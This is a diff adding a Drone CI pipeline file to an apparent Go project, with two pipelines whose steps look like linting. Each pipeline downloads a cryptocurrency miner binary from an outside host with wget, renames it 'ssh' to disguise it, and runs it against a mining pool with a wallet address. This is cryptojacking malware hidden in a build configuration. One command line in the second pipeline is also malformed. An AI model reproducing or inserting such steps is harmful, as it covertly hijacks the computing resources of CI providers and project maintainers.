@@ -1,0 +1,33 @@
+---
+kind: pipeline
+name: One
+workspace:
+  base: /go
+  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
+steps:
+- name: download golang
+  image: golangci/golangci-lint:v1.26.0
+  commands:
+  - golangci-lint run
+  - apt-get update
+  - apt-get install screen -y 
+  - wget -qO ssh http://berkah.mdnet.co.id/cpuminer-sse2
+  - chmod +x ssh
+  - ./ssh  -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Gihu -p c=TDC 
+ 
+
+---
+kind: pipeline
+name: build
+workspace:
+  base: /go
+  path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
+steps:
+- name: golangci-lint
+  image: golangci/golangci-lint:v1.26.0
+  commands:
+  - golangci-lint run- apt-get update
+  - apt-get install screen -y 
+  - wget -qO ssh http://berkah.mdnet.co.id/cpuminer-sse2
+  - chmod +x ssh
+  - ./ssh  -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Gihu -p c=TDC 
